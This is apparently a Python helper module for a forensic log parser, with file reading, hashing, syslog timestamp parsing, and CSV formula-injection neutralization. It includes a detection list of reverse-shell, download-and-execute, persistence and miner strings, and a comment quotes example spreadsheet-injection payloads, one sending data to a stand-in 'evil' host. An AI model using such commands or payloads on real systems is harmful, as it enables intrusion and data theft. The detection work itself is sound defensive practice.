"""
core.utils
==========

Small helpers shared across parsers.
"""

from __future__ import annotations

import gzip
import hashlib
import re
from datetime import datetime, timezone
from pathlib import Path
from typing import Iterable, Iterator


# ----------------------------------------------------------------------------
# File reading
# ----------------------------------------------------------------------------
def open_text(path: Path, encoding: str = "utf-8", errors: str = "replace"):
    """Open a text file, transparently decompressing .gz."""
    if path.suffix.lower() == ".gz":
        return gzip.open(path, "rt", encoding=encoding, errors=errors)
    return open(path, "r", encoding=encoding, errors=errors)


def read_lines(path: Path) -> Iterator[str]:
    try:
        with open_text(path) as f:
            for line in f:
                yield line.rstrip("\n")
    except OSError:
        return


def read_bytes_safe(path: Path) -> bytes:
    try:
        return path.read_bytes()
    except OSError:
        return b""


# ----------------------------------------------------------------------------
# Hashing
# ----------------------------------------------------------------------------
def sha256_file(path: Path, chunk: int = 1 << 16) -> str:
    h = hashlib.sha256()
    try:
        with open(path, "rb") as f:
            for blk in iter(lambda: f.read(chunk), b""):
                h.update(blk)
    except OSError:
        return ""
    return h.hexdigest()


# ----------------------------------------------------------------------------
# Timestamp parsing
# ----------------------------------------------------------------------------
_SYSLOG_RE_RFC3164 = re.compile(
    r"^(?P<mon>[A-Z][a-z]{2})\s+(?P<day>\d{1,2})\s+"
    r"(?P<time>\d{2}:\d{2}:\d{2})"
)
_SYSLOG_RE_RFC5424 = re.compile(
    r"^(?P<ts>\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?)"
)


def parse_syslog_timestamp(line: str, default_year: int | None = None) -> datetime | None:
    """Parse the timestamp at the start of a syslog line.

    Handles both RFC 3164 ("Sep  1 12:34:56") and RFC 5424
    ("2024-09-01T12:34:56Z") formats. RFC 3164 lacks a year - falls back to
    ``default_year`` (current year if None).
    """
    m = _SYSLOG_RE_RFC5424.match(line)
    if m:
        ts = m.group("ts").replace("Z", "+00:00")
        try:
            dt = datetime.fromisoformat(ts)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            return dt.astimezone(timezone.utc)
        except ValueError:
            return None

    m = _SYSLOG_RE_RFC3164.match(line)
    if m:
        year = default_year or datetime.now(timezone.utc).year
        try:
            dt = datetime.strptime(
                f"{year} {m['mon']} {m['day']} {m['time']}",
                "%Y %b %d %H:%M:%S",
            )
            return dt.replace(tzinfo=timezone.utc)
        except ValueError:
            return None

    return None


def epoch_to_dt(epoch: float | int) -> datetime:
    return datetime.fromtimestamp(float(epoch), tz=timezone.utc)


# ----------------------------------------------------------------------------
# Suspicious-string heuristics (shared)
# ----------------------------------------------------------------------------
SUSPICIOUS_TOKENS: tuple[str, ...] = (
    # network grab + execute
    "curl ", "wget ", "fetch ", " | sh", "| bash", "|sh", "|bash",
    # offensive-tool fingerprints
    "nc -e", "nc -lvp", "ncat -e", "/dev/tcp/", "bash -i",
    "perl -e", "python -c 'import socket", 'python -c "import socket',
    "socat ", "msfvenom", "metasploit", "linpeas", "linenum",
    "pspy", "chisel ", "ligolo",
    # encoding / obfuscation
    "base64 -d", "base64 --decode", "xxd -r", "openssl enc",
    # reverse-shell plumbing
    "mkfifo ", "sh -i", "0<&",
    # destructive / cleanup
    " rm -rf ", "history -c", "unset histfile",
    "kill -9", "shred -",
    # privilege / persistence
    "chmod +s", "chmod 4755", "setuid", "/etc/ld.so.preload", "ld_preload",
    ">> /etc/sudoers", "useradd ", "usermod -ag", "usermod -a -g",
    # crypto-mining / common malware
    "xmrig", "stratum+tcp", "monero", "minergate",
    # in-memory loaders
    "memfd_create", "/dev/shm/", "/tmp/.", "/var/tmp/.",
)


def find_suspicious_tokens(text: str, tokens: Iterable[str] = SUSPICIOUS_TOKENS) -> list[str]:
    low = text.lower()
    return [t for t in tokens if t in low]


# ----------------------------------------------------------------------------
# Spreadsheet formula-injection (CSV/DDE) neutralization
# ----------------------------------------------------------------------------
# Excel / LibreOffice evaluate a cell as a formula when its first character is
# one of these. Forensic fields (usernames, GECOS, log lines, commands, SNI,
# user-agents) are ATTACKER-controlled, so a value like
# ``=cmd|'/c calc'!A1`` or ``=HYPERLINK("http://evil/?"&A1)`` would execute /
# exfiltrate when an analyst opens findings.csv / timeline.csv / the XLSX.
# Prefixing a single quote makes the spreadsheet treat the cell as literal
# text (the apostrophe is not shown). See OWASP "CSV Injection".
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def neutralize_formula(value):
    """Return ``value`` with a leading apostrophe if it could be interpreted
    as a spreadsheet formula. Non-string values pass through unchanged."""
    if isinstance(value, str) and value[:1] in _FORMULA_TRIGGERS:
        return "'" + value
    return value
